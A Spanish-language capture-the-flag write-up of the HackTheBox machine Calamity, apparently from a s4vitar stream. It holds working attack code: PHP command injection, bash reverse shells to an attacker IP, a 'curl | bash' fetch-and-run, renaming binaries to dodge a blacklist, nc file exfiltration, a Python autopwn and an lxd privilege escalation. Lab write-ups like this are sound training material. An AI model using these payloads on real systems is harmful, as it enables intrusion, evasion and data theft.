---
layout: post
title: HTB_Calamity
date: 2023/07/10
slug: HTB_Calamity
heroImage: /assets/machines.jpg
---

# Calamity {-}

## Introduccion {-}

La maquina del dia 28/07/2021 se llama Calamity
.

El replay del live se puede ver aqui

[![S4vitaar Calamity maquina](https://img.youtube.com/vi/sREANcb8H1Q/0.jpg)](https://www.youtube.com/watch?v=sREANcb8H1Q)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.27
```
ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.27 -oG allports
extractPorts allPorts
nmap -sC -sV -p22,80 -oN targeted
```

|Puerto|Servicio    | Que se nos occure?                  |    Que falta?      |
|------|------------|-------------------------------------|--------------------|
|22    |ssh         |Accesso directo                      |usuario y contraseña|
|80    |http        |Analizis de la web y Fuzzing         |                    |

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.197
```

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.27 -oN webScan
```

Ya nos detecta un 
```bash
 /admin.php 
```
 y un directorio 
```bash
 /uploads/ 
```


#### Checkear la web del puerto 80 {-}

Abrimos la web y vemos cosas:

- El wappalizer no nos dice nada
- parece que todavia la web esta en fase de desarollo
- el directorio 
```bash
 /uploads/ 
```
 muestra una capacidad de directory listing pero no se ve gran cosa
- el 
```bash
 /admin.php 
```
 nos muestra un login.
- haciendo un 
```bash
 Ctrl-U 
```
 no muestra una contraseña en un comentario ;)




## Evaluacion de vulnerabilidades {-}

### Chequeamos las vulnerabilidades de la pagina admin.php {-}

Ya con el usuario admin y la contraseña encontrada nos podemos logear.

Vemos un input donde podemos poner codigo **HTML**

```bash
Hola
<h1>Hola</h1>
<marquee>Hola</marquee>
```

Funciona... Intentamos ponerle codigo **PHP**

```php
<?php system("whoami"); ?>
```

y tambien funciona...

Aqui decidimos crear una reverse shell para conectarnos al servidor.## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell con una pagina html {-}

1. Creamos un index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.28/443 0>&1
    ```

1. Compartimos un servicio http por el puerto 80

    ```bash
    python3 -m http.server 80
    ```

1. En la web, le damos un curl a nuestra maquina

    ```php
    <?php system("curl 10.10.14.28"); ?>
    ```


Aqui vemos el codigo fuente del index.html creado. La idea aqui seria interpretar el codigo.

1. Escuchamos por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Ejecutamos la reverse shell 

    ```php
    <?php system("curl 10.10.14.28 | bash"); ?>
    ```

La coneccion se entabla pero el servidor nos expulsa directamente.

### Creamos una FakeShell {-}

En el directorio exploits creamos un fichero 
```bash
 fakeShell.sh 
```
 que contiene

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
main_url="http://10.10.10.27/admin.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
done
```

> [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 50:19

Tambien se podria utilizar la heramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

### Analizando el servidor {-}

```bash
whoami
ifconfig
ls -l
ls -l /home
ls -l /home/xalvas
cat /home/xalvas/user.txt
```

Encontramos el usuario **xalvas** y ya podemos leer la flag.

La pregunta aqui seria: Porque no nos deja entablar una reverse shell? Porque el sistema nos expulsa cuando lo hacemos?

El comando 
```bash
 ls -l /home/xalvas 
```
 nos muestra ficheros. En el fichero 
```bash
 intrusions 
```
 vemos lo siguiente

```bash
cat /home/xalvas/intrusions
```


![calamity-itrusios](/assets/images/calamity-intrusions.png) 
Vemos que el comando 
```bash
 nc 
```
 esta BlackListeado y que logea el Proccess Kill en este fichero. El problema de esto es que se puede
que los comandos BlackListeados se controlan con los nombres mismo (no permite 
```bash
 nc, python, bash 
```
). Pero que pasa si copiamos el 
binario bash y que le ponemos un nombre diferente.

1. Nos ponemos en escucha por el puerto 443 en la maquina de atacante

    ```bash
    nc -nlvp 443
    ```

1. Copiamos el tool bash en un lugar donde tenemos derechos de escritura y lo nombramos de otra manera

    ```bash
    cp /bin/bash /dev/shm/s4vitar
    ls /dev/shm/s4vitar
    /dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1
    /dev/shm/s4vitar -c "/dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1"
    /dev/shm/s4vitar -c '/dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1'
    ```

Este truquillo muestra la manera de BlackListear que utiliza la maquina victima porque ya hemos podido entablar la shell
y no nos mata la session.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
export SHELL=bash

stty -a

stty rows <numero filas> columns <numero columnas>
```

### Creacion del autopwn en python {-}

Aqui s4vitar decide crear un autopwn para automatizar el processo de ganacia de accesso

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import threading
import time

from pwn import *

def def_handler(sig, frame):
    
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.27/admin.php"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    headers = {
        'Cookie': 'adminpowa=noonecares'
    }

    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"chmod%20+x%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"/dev/shm/s4vitar%20-c%20'/dev/shm/s4vitar%20-i%20>%26%20/dev/tcp/10.10.14.20/443%200>%261'\");%20?>", headers=headers)

    print(r.text)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest,args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    shell.interactive()
```

Ya lo podemos lanzar con el comando 
```bash
 python3 autopwn.py 
```


> [ ! ] Notas las explicaciones paso a paso del autopwn se pueden ver en el video al minuto 1:06:21


### Investigamos la maquina {-}

Ya hemos visto una lista de archivos en el repertorio de xalvas y uno es un fichero 
```bash
 .wav 
```
. Nos lo enviamos
a nuestra maquina de atacante.

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > recov.wav
    ```

1. En la maquina victima

    ```bash
    cp /bin/nc /dev/shm/transfer
    chmod +x /dev/shm/transfer
    /dev/shm/transfer 10.10.14.20 443 < recov.wav
    ```

Hay otros ficheros de tipo 
```bash
 .wav 
```
, usando la misma tecnica nos lo enviamos tambien.
Chequeamos que los ficheros no sa hayan comprometido durante la tansferencia con 
```bash
 md5sum 
```
. Los ficheros 
```bash
 .wav 
```
 son ficheros
de tipo audio y se pueden escuchar con el comando 
```bash
 play recov.wav 
```


No os asusteis con la musiquita ;)

Escuchando los otros ficheros parece que el fichero 
```bash
 rick.wav 
```
 sea la misma cancion y esto es raro. Si le hacemos un 
```bash
 md5sum recov.wav rick.wav 
```
,
vemos que la cancion es la misma pero el **md5sum** no. Quiere decir que la integridad de la data de uno de estos ficheros a sido manipulada.


### Reto de steganografia con Audacity {-}

**Audacity** es una heramienta de audio que se puede instalar con 
```bash
 apt install audacity 
```
. Lo abrimos y cargamos los dos ficheros.
Si nos dan 2 audios que parecen se los mismos pero hemos visto con el **md5sum** que no son iguales, Una cosa que se puede hacer es 
lanzar un audio de manera normal y al mismo tiempo con el segundo audio, invertir la onda del audio. Si hacemos esto y que los dos ficheros
son ciertamente iguales, no tendriamos que escuchar nada. Lo unico, en este caso que se tendria que escuchar seria las diferencias ente
los dos audios.

> [ ! ] Notas para ver como invertir las ondas de un audio, podeis mirar el video al minuto 1:31:00

Ya tenemos una contraseña.

Intentamos ponerle la contraseña al usuario xalvas y entramos

```bash
su xalvas
Password: <la contraseña>
whoami
#Output 
xalvas
```## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
id
```

En este punto vemos que el usuario xalvas esta en el grupo **lxd** y ya tenemos la posibilidad de escalar privilegios con esto.

```bash
searchsploit lxd
searchsploit -x 46978
```

Si Si el exploit a sido creado por el mismo S4vitar. Para usar el exploit, lo primero es mirar si estamos en una maquina 32 o 64 bits.

```bash
uname -a
```

Seguimos los pasos del exploit

1. En la maquina de atacante

    ```bash
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
    chmod +x build-alpine
    ./build-alpine # --> para maquinas x64
    ./build-alpine -a i686 # --> para maquinas i686
    searchsploit -m 46978
    mv 46978.sh lxd_privesc.sh
    dos2unix lxd_privesc.sh
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    wget http://10.10.14.20/alpine-v3-14-i686-20210728_2134.tar.gz
    wget http://10.10.14.20/lxd_privesc.sh
    chmod +x lxd_privesc.sh
    ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
    ```

1. vemos un error 
```bash
 error: This must be run as root 
```
. Modificamos el fichero lxd_privesc.sh

    ```bash
    nano lxd_privesc.sh
    ```

    en la function createContainer(), borramos la primera linea:
    
    ```bash
    # lxc image import $filename --alias alpine && lxd init --auto
    ```

1. Ya estamos root pero en el contenedor. Modificamos la 
```bash
 /bin/bash 
```
 de la maquina

    - en el contenedor

        ```bash
        cd /mnt/root
        ls
        cd /bin
        chmod 4755 bash
        exit
        ```

    - en la maquina victima

        ```bash
        bash -p
        whoami
        #Output
        root
        ```